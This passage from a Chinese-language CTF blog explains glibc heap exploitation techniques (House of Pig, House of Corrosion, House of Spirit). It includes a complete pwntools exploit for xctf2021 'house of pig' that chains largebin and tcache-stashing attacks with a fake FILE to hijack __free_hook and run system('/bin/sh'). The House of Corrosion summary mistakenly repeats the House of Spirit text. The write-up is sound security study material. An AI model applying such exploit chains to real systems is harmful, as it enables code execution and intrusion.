!(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *new_buf;</span><br><span class="line">  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">      <span class="built_in">free</span> (old_buf);</span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><p>重点看这部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line"><span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"><span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">  <span class="keyword">return</span> EOF;</span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line"><span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (old_buf)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">    <span class="built_in">free</span> (old_buf);</span><br><span class="line">    <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">    fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>构造 FILE 结构的时候，重点是将其 <strong>vtable 由 _IO_file_jumps 修改为 _IO_str_jumps，那么当原本应该调用 IO_file_overflow 的时候，就会转而调用如下的 IO_str_overflow。</strong></p><p>而该函数是以传入的 FILE 地址本身为参数的，同时其中会连续调用 malloc,memcpy,free三个函数，且三个函数的参数又都可以被该 FILE 结构中的数据控制。</p><p>那么适当的构造 FILE 结构中的数据，就可以实现</p><ol><li>利用 IO_str_overflow 函数中的 <code>malloc</code> 申请出那个已经被放入到 tcache 链表的头部的包含 <code>__free_hook</code> 的 fake chunk；</li><li>紧接着可以将提前在堆上布置好的数据，通过 IO_str_overflow 函数中的<code>memcpy</code> 写入到刚刚申请出来的包含<code>__free_hook</code>的这个 chunk，从而能任意控制 <code>__free_hook</code> ，这里可以将其修改为 system函数地址；</li><li>最后调用 IO_str_overflow 函数中的 <code>free</code> 时，就能够触发 __free_hook ，同时还能在提前布置堆上数据的时候，使其以字符串 “/bin/sh\x00” 开头，那么最终就会执行 system(“/bin/sh”)。</li></ol><p>FILE结构的参数应满足</p><ol><li>_IO_NO_WRITES标志为false,_IO_USER_BUF标志为false</li><li>fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base <strong>&gt;=</strong> fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base - 1</li><li>fp-&gt;_IO_buf_base指向存储有”/bin/sh”和system地址的chunk,old_buf中的内容复制到new_buf时应注意对应</li><li>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base合适</li></ol><h2 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h2><p><strong>xctf2021-house of pig</strong></p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/pig&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序只使用calloc,这就意味着不会使用tcache</p><p>主要的漏洞是在改变猪猪的时候，备份和更新结构体时未对 des_exist_sign[24] 数组更新</p><p>也就是说一只猪猪释放了一个chunk后,切换成另一只猪猪再切换回来,就能uaf</p><p>c++反编译出来的代码看不太懂</p><p>暂时先这样</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;182.92.203.154&#x27;, 35264)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : io.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : io.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : io.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : io.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : io.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : io.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(io, text)</span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Menu</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Choice: &#x27;</span>, <span class="built_in">str</span>(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">size, content</span>):</span><br><span class="line">    Menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&#x27;message: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Show</span>(<span class="params">idx</span>):</span><br><span class="line">    Menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    Menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;message: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Del</span>(<span class="params">idx</span>):</span><br><span class="line">    Menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Change</span>(<span class="params">user</span>):</span><br><span class="line">    Menu(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> user == <span class="number">1</span>:</span><br><span class="line">        sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;A\x01\x95\xc9\x1c&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> user == <span class="number">2</span>:</span><br><span class="line">        sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;B\x01\x87\xc3\x19&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> user == <span class="number">3</span>:</span><br><span class="line">        sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;C\x01\xf7\x3c\x32&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;source ./libcdebug/loadsym.py</span></span><br><span class="line"><span class="string">loadsym /home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/.debug/libc-2.31.so</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#----- prepare tcache_stashing_unlink_attack</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    Add(<span class="number">0x90</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># B0~B4</span></span><br><span class="line">    Del(x)    <span class="comment"># B0~B4</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">0x150</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>) <span class="comment"># A0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Add(<span class="number">0x150</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>) <span class="comment"># A1~A7</span></span><br><span class="line">    Del(<span class="number">1</span>+x)</span><br><span class="line">Del(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0xb0</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># B5 split 0x160 to 0xc0 and 0xa0</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">0x180</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x78</span>) <span class="comment"># A8</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Add(<span class="number">0x180</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x78</span>) <span class="comment"># A9~A15</span></span><br><span class="line">    Del(<span class="number">9</span>+x)</span><br><span class="line">Del(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0xe0</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x38</span>) <span class="comment"># B6 split 0x190 to 0xf0 and 0xa0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- leak libc_base and heap_base</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># A16</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0xf0</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x48</span>) <span class="comment"># B7</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Del(<span class="number">16</span>)<span class="comment">#put A16 into unsorted</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0x440</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># B8   make A16 into largebin</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Show(<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;message is: &#x27;</span>)</span><br><span class="line">libc_base = uu64(rl()) - <span class="number">0x1ebfe0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">16</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0xf</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">Show(<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;message is: &#x27;</span>+<span class="string">&#x27;A&#x27;</span>*<span class="number">0xf</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = uu64(rl()) - <span class="number">0x13940</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- first largebin_attack</span></span><br><span class="line">Edit(<span class="number">16</span>, <span class="number">2</span>*p64(libc_base+<span class="number">0x1ebfe0</span>) + <span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># recover</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># A17</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># A18</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># A19</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Del(<span class="number">8</span>)</span><br><span class="line">Add(<span class="number">0x450</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x168</span>) <span class="comment"># B9</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Del(<span class="number">17</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(free_hook-<span class="number">0x28</span>) +<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Add(<span class="number">0xa0</span>, <span class="string">&#x27;C&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># C0 triger largebin_attack, write a heap addr to __free_hook-8</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Edit(<span class="number">8</span>, <span class="number">2</span>*p64(heap_base+<span class="number">0x13e80</span>) + <span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># recover</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- second largebin_attack</span></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line">Add(<span class="number">0x380</span>, <span class="string">&#x27;C&#x27;</span>*<span class="number">0x118</span>) <span class="comment"># C1</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Del(<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">IO_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">Edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(IO_list_all-<span class="number">0x20</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line">Add(<span class="number">0xa0</span>, <span class="string">&#x27;C&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># C2 triger largebin_attack, write a heap addr to _IO_list_all</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Edit(<span class="number">8</span>, <span class="number">2</span>*p64(heap_base+<span class="number">0x13e80</span>) + <span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># recover</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- tcache_stashing_unlink_attack and FILE attack</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x50</span> + p64(heap_base+<span class="number">0x12280</span>) + p64(free_hook-<span class="number">0x20</span>)</span><br><span class="line">Edit(<span class="number">8</span>, payload +<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(heap_base+<span class="number">0x147c0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x158</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">Add(<span class="number">0x440</span>, payload) <span class="comment"># C3 change fake FILE _chain</span></span><br><span class="line">Add(<span class="number">0x90</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># C4 triger tcache_stashing_unlink_attack, put the chunk of __free_hook into tcache</span></span><br><span class="line"></span><br><span class="line">IO_str_vtable = libc_base + <span class="number">0x1ED560</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fake_IO_FILE = <span class="number">2</span>*p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                    <span class="comment">#change _IO_write_base = 1</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffff</span>)        <span class="comment">#change _IO_write_ptr = 0xffffffffffff</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x148a0</span>)                <span class="comment">#v4</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x148b8</span>)                <span class="comment">#v5</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                    <span class="comment">#change _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_str_vtable)        <span class="comment">#change vtable</span></span><br><span class="line">payload = fake_IO_FILE + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="number">2</span>*p64(system_addr)</span><br><span class="line">sa(<span class="string">&#x27;Gift:&#x27;</span>, payload)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">Menu(<span class="number">5</span>)</span><br><span class="line">sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h1 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House of Corrosion"></a>House of Corrosion</h1><h2 id="概要-7"><a href="#概要-7" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Spirit的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p><strong>利用条件:</strong></p><ol><li>需要一个UAF漏洞</li><li>可以分配较大的堆块（size &lt;=0x3b00)</li></ol><p><strong>利用效果:</strong></p><p><strong>有效版本:</strong>2.32以前</p><h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><p>首先要先知道 global_max_fast 是 GLIBC 用来储存 fastbin 链表能够储存的最大大小，其默认值为 0x80，也就是 Fastbin 的默认 Size 范围是在 [0x20, 0x80]。</p><p>而此方法，其根本的思想就是通过往 global_max_fast 写入一个很大的值，来造成 fastbinsY 数组溢出。如果利用其他漏洞在这个位置写一个很大的值，会使得在 malloc 和 free 堆块的时候，很大 Size 堆块都被判定为是 fastbin 类型的堆块，fastbinsY 是在 GLIBC 上储存 fastbin 不同大小链表头指针的一段空间，为大小从 0x20 开始的 fastbin 链表预留了十个指针。</p><p>这意味着，如果有 SIZE 超过 0xB0 的堆块，那么这个堆块计算得到的索引值就会超出 fastbinsY 的最大范围，造成数组越界。可以使用以下公式来计算出目标溢出位置，对应的需要构造的堆块 SIZE，其中的 delta 指的是溢出位置到 fastbinsY 首地址的差值。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk size = (delta * 2) + 0x20</span><br></pre></td></tr></table></figure><p>不过也可以看出只能覆写比fastbinY高处的东西</p><h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><h2 id="概要-8"><a href="#概要-8" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Spirit的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p><strong>利用条件:</strong></p><ol><li>能free指定地址</li></ol><p><strong>利用效果:</strong>获得包含目标地址的chunk</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h2><p>在可控区域伪造或寻找一个fake_chunk,并free它,使其进入fastbin中</p><p>fake_chunk的条件</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li><strong>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</strong></li><li>fake chunk 的 <strong>size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</strong></li><li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> ,且prev_size要和fakechunk的对应</li><li>不能double free</li></ul><h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 